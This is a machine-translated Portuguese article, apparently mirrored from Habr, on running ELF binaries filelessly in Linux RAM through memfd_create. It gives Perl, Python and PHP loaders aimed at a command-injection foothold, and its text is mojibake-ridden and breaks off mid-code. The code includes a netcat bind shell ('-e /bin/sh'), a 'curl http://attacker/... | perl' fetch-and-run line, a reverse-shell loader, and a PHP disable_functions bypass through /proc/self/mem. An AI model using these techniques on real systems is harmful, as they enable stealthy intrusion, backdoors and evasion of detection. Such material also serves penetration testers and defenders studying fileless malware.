<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë©üèæ‚Äçü§ù‚Äçüë®üèø üì§ üìº Elfos na mem√≥ria. Executando o ELF na RAM do Linux üöΩ üò¨ üëß</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A distribui√ß√£o de malware sem arquivos est√° ganhando popularidade. O que n√£o √© surpreendente, porque o trabalho de tais programas praticamente n√£o dei...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Elfos na mem√≥ria. Executando o ELF na RAM do Linux</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/430902/"><p><img src="https://habrastorage.org/webt/rg/xt/yd/rgxtyd3contgoitlza_ve1zah2g.jpeg"></p><br><p>  A distribui√ß√£o de malware sem arquivos est√° ganhando popularidade.  O que n√£o √© surpreendente, porque o trabalho de tais programas praticamente n√£o deixa vest√≠gios.  Neste artigo, n√£o abordaremos a t√©cnica de execu√ß√£o de programas na mem√≥ria do Windows.  N√≥s nos concentramos no GNU / Linux.  O Linux domina por direito o segmento de servidores, vive em milh√µes de dispositivos incorporados e fornece a grande maioria dos recursos da web.  A seguir, faremos uma breve revis√£o das possibilidades de execu√ß√£o de programas na mem√≥ria e demonstraremos que isso √© poss√≠vel mesmo em condi√ß√µes dif√≠ceis. </p><a name="habracut"></a><br><p>  As t√©cnicas de execu√ß√£o sem arquivos s√£o secretas; √© extremamente dif√≠cil detectar e rastrear seu uso.  As ferramentas de controle de integridade do sistema de arquivos n√£o avisam o administrador, pois n√£o ocorrem opera√ß√µes de grava√ß√£o no disco ou altera√ß√µes no arquivo.  O software antiv√≠rus (geralmente negligenciado pelos usu√°rios * nix) geralmente n√£o monitora a mem√≥ria do programa ap√≥s a inicializa√ß√£o.  Al√©m disso, em muitas distribui√ß√µes GNU / Linux, imediatamente ap√≥s a instala√ß√£o, est√° dispon√≠vel uma ampla variedade de v√°rios utilit√°rios de depura√ß√£o, int√©rpretes, compiladores de linguagens de programa√ß√£o e bibliotecas.  Tudo isso cria excelentes condi√ß√µes para o uso de t√©cnicas de execu√ß√£o secreta e livre de arquivos.  Mas, al√©m das vantagens de seu uso, tamb√©m existem desvantagens - esses programas n√£o sobrevivem ao blecaute ou √† reinicializa√ß√£o do host de destino.  Mas enquanto o host est√° sendo executado, o programa funciona. </p><br><p>  Tais t√©cnicas podem e devem ser usadas n√£o apenas para a distribui√ß√£o de malware.  Se a velocidade de execu√ß√£o do seu programa for cr√≠tica para voc√™, descarregue-a na RAM.  Na verdade, muitas distribui√ß√µes Linux se sentem bem quando executadas completamente na RAM, o que permite trabalhar com discos r√≠gidos sem salvar nenhum arquivo neles.  Do ponto de vista da auditoria de seguran√ßa da informa√ß√£o, os m√©todos de execu√ß√£o secreta de programas s√£o muito √∫teis como um est√°gio de p√≥s-opera√ß√£o e reconhecimento dentro do per√≠metro da rede de destino.  Especialmente se o sigilo m√°ximo for uma das condi√ß√µes de auditoria. <br>  Segundo o portal <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">barkly.com</a> em 2018, j√° 35% dos ataques de v√≠rus ocorrem em software malicioso em execu√ß√£o na mem√≥ria. </p><br><p>  No caso do Windows, os cibercriminosos usam ativamente o sistema Powershell pr√©-instalado para baixar e executar o c√≥digo imediatamente.  Essas t√©cnicas s√£o amplamente utilizadas, entre outras coisas, gra√ßas √† sua implementa√ß√£o em estruturas como Powershell Empire, Powersploit e Metasploit Framework. </p><br><h1 id="a-chto-naschet-linux">  E o Linux? </h1><br><p>  Na maioria dos casos, as distribui√ß√µes Linux instaladas nos hosts possuem um conjunto de software pr√©-instalado.  Como regra geral, est√£o dispon√≠veis int√©rpretes de linguagens de programa√ß√£o: compilador Python, Perl, C. O PHP est√° presente nos sites de hospedagem no ap√™ndice.  Essa condi√ß√£o fornece a capacidade de executar c√≥digo usando esses idiomas. </p><br><p>  No Linux, temos v√°rias op√ß√µes conhecidas para executar c√≥digo na mem√≥ria. <br>  A maneira mais f√°cil √© usar a √°rea de mem√≥ria compartilhada pr√©-montada no sistema de arquivos. </p><br><p>  Ao colocar o arquivo execut√°vel no diret√≥rio / dev / shm ou / run / shm, √© poss√≠vel execut√°-lo diretamente na mem√≥ria, pois esses diret√≥rios nada mais s√£o do que uma mem√≥ria de acesso aleat√≥rio montada no sistema de arquivos.  Mas eles podem ser visualizados com ls como em qualquer outro diret√≥rio.  Como regra, esses diret√≥rios s√£o montados com o sinalizador noexec e a execu√ß√£o de programas nesses diret√≥rios est√° dispon√≠vel apenas para o superusu√°rio.  Portanto, para ser um pouco mais discreto, voc√™ precisa de outra coisa. </p><br><p> Mais digna de nota √© a chamada do sistema <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">memfd_create (2)</a> .  Essa chamada do sistema funciona aproximadamente como <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">malloc (3)</a> , mas n√£o retorna um ponteiro para uma √°rea de mem√≥ria, mas um descritor de arquivo para um arquivo an√¥nimo, vis√≠vel no sistema de arquivos apenas como um link em <code>/proc/PID/fd/</code> , pelo qual pode ser executado usando <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">execve (2).</a> <br>  Aqui est√° o que a p√°gina do manual para usar a chamada de sistema <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">memfd_create (em russo)</a> diz: </p><br><p>  <em>"O nome especificado em</em> <code>name</code> <em>√© usado como o nome do arquivo e ser√° mostrado como o destino do link simb√≥lico correspondente no diret√≥rio. <code>/proc/self/fd/</code> . O nome de exibi√ß√£o sempre come√ßa com <code>memfd:</code> e √© apenas para depura√ß√£o. Os nomes n√£o afetam o comportamento do arquivo "descritor e, portanto, v√°rios arquivos podem ter o mesmo nome sem consequ√™ncias."</em> </p><br><p>  Um exemplo de uso de <code>memfd_create()</code> para o idioma C: </p><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/wait.h&gt; #include &lt;unistd.h&gt; int main() { int fd; pid_t child; char buf[BUFSIZ] = ""; ssize_t br; fd = syscall(SYS_memfd_create, "foofile", 0); if (fd == -1) { perror("memfd_create"); exit(EXIT_FAILURE); } child = fork(); if (child == 0) { dup2(fd, 1); close(fd); execlp("/bin/date", "/bin/date", NULL); perror("execlp date"); exit(EXIT_FAILURE); } else if (child == -1) { perror("fork"); exit(EXIT_FAILURE); } waitpid(child, NULL, 0); lseek(fd, 0, SEEK_SET); br = read(fd, buf, BUFSIZ); if (br == -1) { perror("read"); exit(EXIT_FAILURE); } buf[br] = 0; printf("child said: '%s'\n", buf); exit(EXIT_SUCCESS); }</span></span></span></span></code> </pre><br><p>  O c√≥digo acima usa <code>memfd</code> , cria um processo filho, direciona sua sa√≠da para um arquivo tempor√°rio, aguarda a conclus√£o do processo filho e l√™ sua sa√≠da do arquivo tempor√°rio.  Normalmente, o pipe "|" √© usado para redirecionar a sa√≠da de um programa para a entrada de outro no * nix. </p><br><p>  A capacidade de usar <code>syscall()</code> tamb√©m est√° dispon√≠vel em linguagens interpretadas como perl, python, etc ... Em seguida, consideramos um dos cen√°rios poss√≠veis e demonstramos a capacidade de carregar arquivos execut√°veis ‚Äã‚Äãna mem√≥ria usando <code>memfd_create()</code> . </p><br><h3 id="perl">  Perl </h3><br><p>  Suponha que tenhamos um ponto de entrada na forma de inje√ß√£o de comando. <br>  Precisamos de uma maneira de fazer chamadas ao sistema de destino. <br>  No perl, a fun√ß√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">syscall ()</a> nos ajudar√° com isso. <br>  Tamb√©m precisaremos de uma maneira de gravar nossa ELF diretamente na mem√≥ria como o conte√∫do de um arquivo an√¥nimo. <br>  Para fazer isso, colocaremos nossa ELF diretamente no corpo do script, que por sua vez ser√° transferido para o sistema de destino atrav√©s da inje√ß√£o de comando dispon√≠vel.  Como alternativa, voc√™ tamb√©m pode baixar o arquivo execut√°vel pela rede. <br>  Mas antes disso vale a pena fazer uma reserva.  Precisamos conhecer a vers√£o do kernel do linux no host de destino, pois a chamada do sistema <code>memfd_create()</code> necess√°ria est√° dispon√≠vel apenas a partir da vers√£o <strong>3.17</strong> e superior. </p><br><p>  Vamos dar uma <code>memfd_create()</code> em <code>memfd_create()</code> e <code>execve()</code> </p><br><p>  Para nosso arquivo an√¥nimo, usaremos a constante <code>MFD_CLOEXEC</code> , que "define o sinalizador de <code>close-on-exec (FD_CLOEXEC)</code> para um novo descritor de arquivo aberto".  Isso significa que nosso descritor de arquivo ser√° fechado automaticamente ap√≥s executarmos o ELF usando <code>execve()</code> </p><br><p>  Como usaremos a fun√ß√£o <code>syscall()</code> da linguagem Perl, precisaremos de valores num√©ricos para chamar nosso <code>syscall</code> e seu par√¢metro. <br>  Voc√™ pode encontr√°-los em <code>/usr/include</code> ou na Internet.  O n√∫mero de chamada do sistema pode ser encontrado em <code>#define</code> come√ßando com <code>__NR_</code> <br>  No nosso caso, <code>memfd_create()</code> √© numerado 319 para um sistema operacional de 64 bits.  E a constante √© <code>FD_CLOSEXEC 0x0001U</code> (ou seja, 1 no <code>linux/memfd.h</code> ) </p><br><p>  Agora temos todos os valores num√©ricos necess√°rios e podemos escrever em Perl um an√°logo de <code>memfd_create(name, MFD_CLOEXEC)</code> de C. <br>  Tamb√©m precisamos criar um nome de arquivo que ser√° exibido em <code>/memfd:</code> <br>  Ser√° ideal escolher um nome semelhante a <code>[:kworker]</code> ou outro, sem causar suspeitas. <br>  Por exemplo, passaremos uma string vazia para o par√¢metro name: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $name = <span class="hljs-string"><span class="hljs-string">""</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $fd = <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span>(<span class="hljs-number"><span class="hljs-number">319</span></span>, $name, <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $fd) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"memfd_create: $!"</span></span>; }</code> </pre> <br><p>  Agora temos o descritor de arquivo an√¥nimo em $ fd e precisamos gravar o ELF nesse arquivo. <br>  A fun√ß√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">open ()</a> no perl geralmente √© usada para abrir arquivos, mas usando a constru√ß√£o <code>&gt;&amp;=FD</code> , passando o descritor para essa fun√ß√£o em vez do nome do arquivo, transformamos o descritor de arquivo j√° aberto no identificador de arquivo. <br>  <code>autoflush[]</code> tamb√©m seria √∫til para <code>autoflush[]</code> : </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $FH, <span class="hljs-string"><span class="hljs-string">'&gt;&amp;='</span></span>.$fd) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"open: $!"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">select</span></span>((<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>($FH), $|=<span class="hljs-number"><span class="hljs-number">1</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]);</code> </pre> <br><p>  Agora, temos um identificador que se refere a um arquivo an√¥nimo. </p><br><p>  Em seguida, precisamos converter nosso arquivo execut√°vel em dados que podem ser colocados no corpo de um script Perl. <br>  Para fazer isso, realizamos: </p><br><pre> <code class="plaintext hljs">$ perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(&lt;&gt;)' ./elfbinary</code> </pre> <br><p>  Temos muitas linhas semelhantes: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">7</span></span>f454c4602010100000000000000000002003e0001000000304f45000000000<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">4000000000000000</span></span>c8010000000000000000000040003800070040001700030<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">0600000004000000400000000000000040004000000000004000400000000000</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/;</code> </pre> <br><p>  Depois de execut√°-los, colocaremos nosso arquivo execut√°vel na mem√≥ria.  Tudo o que resta para n√≥s √© lan√ß√°-lo. </p><br><h4 id="fork">  garfo () </h4><br><p>  Opcionalmente, podemos usar <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">fork ()</a> .  Isso n√£o √© necess√°rio.  Mas se quisermos n√£o apenas executar o ELF e matar o processo, precisaremos usar o <code>fork()</code> . <br>  Em geral, a cria√ß√£o de um processo filho em perl se parece com isso: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">while</span></span> ($keep_going) { <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $pid = <span class="hljs-keyword"><span class="hljs-keyword">fork</span></span>(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $pid) { <span class="hljs-comment"><span class="hljs-comment"># Error die "fork: $!"; } if (0 == $pid) { exit 0; } }</span></span></code> </pre> <br><p>  A utilidade do <code>fork()</code> tamb√©m <code>fork()</code> no fato de que, chamando-o juntamente com o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">setsid (2)</a> , voc√™ pode separar o processo filho do processo pai e deixar o pai terminar: </p><br><pre> <code class="perl hljs"><span class="hljs-comment"><span class="hljs-comment">#    my $pid = fork(); if (-1 == $pid) { # Error die "fork1: $!"; } if (0 != $pid) { #   exit 0; } #     if (-1 == syscall(112)) { die "setsid: $!"; } #    () $pid = fork(); if (-1 == $pid) { # Error die "fork2: $!"; } if (0 != $pid) { #    exit 0; } #   ""</span></span></code> </pre> <br><p>  Agora podemos executar o ELF em muitos processos. </p><br><h4 id="execve">  Execute () </h4><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Execve ()</a> √© uma chamada de sistema que nos permite executar um programa.  O Perl nos fornece funcionalidade semelhante atrav√©s da fun√ß√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Exec ()</a> , que funciona exatamente como a chamada de sistema acima mencionada, mas possui uma sintaxe muito mais simples e conveniente. <br>  Precisamos passar duas coisas para <code>exec()</code> : o arquivo que queremos executar (nossa mem√≥ria ELF carregada anteriormente) e o nome do processo como um dos argumentos passados.  Normalmente, o nome do processo corresponde ao nome do arquivo execut√°vel.  Mas como veremos <code>/proc/PID/fd/3</code> na lista de processos, chamaremos nosso processo de outra coisa. <br>  A sintaxe para <code>exec()</code> seguinte: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">exec</span></span> {<span class="hljs-string"><span class="hljs-string">"/proc/$$/fd/$fd"</span></span>} <span class="hljs-string"><span class="hljs-string">"nc"</span></span>, <span class="hljs-string"><span class="hljs-string">"-kvl"</span></span>, <span class="hljs-string"><span class="hljs-string">"4444"</span></span>, <span class="hljs-string"><span class="hljs-string">"-e"</span></span>, <span class="hljs-string"><span class="hljs-string">"/bin/sh"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"exec: $!"</span></span>;</code> </pre> <br><p>  O exemplo acima inicia o Netcat.  Mas gostar√≠amos de lan√ßar algo um pouco menos como um backdoor. <br>  O processo iniciado n√£o ter√° um link para o arquivo an√¥nimo em <code>/proc/PID/fd</code> , mas sempre podemos encontrar nosso ELF no link <code>/proc/PID/exe</code> , que aponta para o arquivo do processo em execu√ß√£o. <br>  Por isso, lan√ßamos o ELF na mem√≥ria do Linux, sem tocar no disco e nem no sistema de arquivos. <br>  √â poss√≠vel baixar nosso arquivo execut√°vel para o sistema de destino de maneira r√°pida e conveniente, por exemplo, passando um script para o interpretador Perl, no corpo do qual colocamos o ELF e o colocamos em uma hospedagem externa: <code>$ curl http://attacker/evil_elf.pl | perl</code> <code>$ curl http://attacker/evil_elf.pl | perl</code> </p><br><h3 id="python">  Python </h3><br><p>  Semelhante √† op√ß√£o Perl, precisamos fazer o seguinte: </p><br><ul><li>  usando a chamada de sistema memfd_create (), crie um arquivo an√¥nimo na mem√≥ria </li><li>  grava ELF execut√°vel nesse arquivo </li><li>  execute-o e opcionalmente execute-o v√°rias vezes com fork () </li></ul><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> ctypes <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-comment"><span class="hljs-comment">#   .     - binary = open('/tmp/rev-shell','rb').read() fd = ctypes.CDLL(None).syscall(319,"",1) #  memfd_create     final_fd = open('/proc/self/fd/'+str(fd),'wb') #    . final_fd.write(binary) final_fd.close() fork1 = os.fork() #   if 0 != fork1: os._exit(0) ctypes.CDLL(None).syscall(112) #  setsid()     . fork2 = os.fork() #     . if 0 != fork2: os._exit(0) os.execl('/proc/self/fd/'+str(fd),'argv0','argv1') #    .</span></span></code> </pre> <br><p>  No caso de python, para chamar <code>syscall</code> , precisamos do m√≥dulo padr√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">ctypes</a> e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">os</a> para escrever e executar o arquivo e controlar o processo.  Tudo √© completamente an√°logo √† vers√£o perl. <br>  No c√≥digo acima, escrevemos no arquivo um arquivo localizado anteriormente no <code>/tmp/</code> .  No entanto, nada nos impede de baixar o arquivo do servidor web. </p><br><h3 id="php">  Php </h3><br><p>  Nesta fase, j√° podemos usar perl e python.  Os int√©rpretes desses idiomas s√£o instalados por padr√£o em muitos sistemas operacionais.  Mas o mais interessante, como sempre, est√° √† frente. <br>  Se, por alguma raz√£o, int√©rpretes perl ou python n√£o estiverem dispon√≠veis para n√≥s, seria √≥timo usar o PHP.  Essa linguagem √© muito popular entre os desenvolvedores da web.  E se j√° descobrimos a capacidade de executar c√≥digo em um aplicativo Web, √© com grande probabilidade que o int√©rprete PHP nos encontre. </p><br><p>  Infelizmente, o php n√£o possui mecanismos <code>syscall</code> para chamar o <code>syscall</code> . <br>  Nos deparamos com uma <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">postagem</a> de Beched'a no f√≥rum rdot (Thanks Beched!), Que sobrescreve a chamada da fun√ß√£o <code>open</code> para o <code>system</code> por meio de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">procfs</a> <code>/proc/self/mem</code> na mem√≥ria do processo atual e ignora o <code>disable_functions</code> . <br>  Usamos esse truque para reescrever a fun√ß√£o em nosso c√≥digo, o que causar√° as chamadas de sistema necess√°rias. <br>  Passaremos syscall para o interpretador php na forma de shellcode no assembler. <br>  As chamadas do sistema precisar√£o ser transmitidas por uma sequ√™ncia de comandos. <br>  Vamos come√ßar a escrever um script PHP.  Em seguida haver√° muita magia. </p><br><p>  Primeiro, denotamos os par√¢metros necess√°rios: </p><br><pre> <code class="php hljs"> $elf = file_get_contents(<span class="hljs-string"><span class="hljs-string">"/bin/nc.traditional"</span></span>); <span class="hljs-comment"><span class="hljs-comment">// elf_payload $args = "test -lvvp 31338 -e /bin/bash"; // argv0 argv1 argv2 ...</span></span></code> </pre> <br><p>  Indique a mudan√ßa - os valores superior e inferior na mem√≥ria, onde mais tarde colocaremos nosso c√≥digo de shell: </p><br><pre> <code class="php hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">packlli</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ $higher = ($value &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff00000000</span></span>) &gt;&gt; <span class="hljs-number"><span class="hljs-number">32</span></span>; $lower = $value &amp; <span class="hljs-number"><span class="hljs-number">0x00000000ffffffff</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> pack(<span class="hljs-string"><span class="hljs-string">'V2'</span></span>, $lower, $higher); }</code> </pre> <br><p>  A seguir, √© a fun√ß√£o pela qual o arquivo bin√°rio √© "descompactado".  Para fazer isso, convertemos os dados bin√°rios em uma representa√ß√£o decimal usando a fun√ß√£o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">hexdex () dos</a> dados bin√°rios <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">bin2hex ()</a> na <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">ordem inversa</a> (para armazenamento): </p><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">unp</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> hexdec(bin2hex(strrev($value))); }</code> </pre> <br><p>  Em seguida, o arquivo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">ELF</a> √© analisado para obter compensa√ß√µes: </p><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseelf</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($bin_ver, $rela = false)</span></span></span><span class="hljs-function"> </span></span>{ $bin = file_get_contents($bin_ver); $e_shoff = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x28</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span>)); $e_shentsize = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3a</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shnum = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3c</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shstrndx = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3e</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>($i = <span class="hljs-number"><span class="hljs-number">0</span></span>; $i &lt; $e_shnum; $i += <span class="hljs-number"><span class="hljs-number">1</span></span>) { $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($sh_type == <span class="hljs-number"><span class="hljs-number">11</span></span>) { <span class="hljs-comment"><span class="hljs-comment">// SHT_DYNSYM $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) { // SHT_STRTAB $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); } elseif($rela &amp;&amp; $sh_type == 4) { // SHT_RELA $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_ + 24, 8)); $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } } if($rela) { for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) { $r_offset = unp(substr($bin, $i, 8)); $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32; $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == 'open') { return $r_offset; } } } else { for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) { $name_off = unp(substr($bin, $i, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == '__libc_system') { $system_offset = unp(substr($bin, $i + 8, 8)); } if($name == '__open') { $open_offset = unp(substr($bin, $i + 8, 8)); } } return array($system_offset, $open_offset); }</span></span></code> </pre> <br><p>  Al√©m disso, exibimos informa√ß√µes sobre a vers√£o instalada do PHP: </p><br><pre> <code class="php hljs"><span 